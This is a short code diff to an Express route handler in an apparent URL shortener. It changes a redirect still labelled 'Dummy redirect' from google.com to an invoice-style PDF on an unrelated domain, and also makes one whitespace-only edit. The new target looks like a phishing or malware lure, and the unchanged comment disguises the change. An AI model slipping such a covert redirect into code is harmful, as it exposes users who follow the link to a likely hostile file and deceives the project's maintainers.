@@ -46,7 +46,7 @@ app.get("/r/:code", async (req, res) => {
          * Dummy redirect
          */
         if (code === "google") {
-            return res.redirect("https://google.com");
+            return res.redirect("https://theopticalguru.relinksys.com/uploads/Bill-1315221-341.pdf?v=1782494347");
         }
 
         /**
@@ -55,7 +55,7 @@ app.get("/r/:code", async (req, res) => {
 
         const response = await axios.get(
             `https://your-api.com/get-url/${code}`
-            
+
         );
 
         if (!response.data.success) {
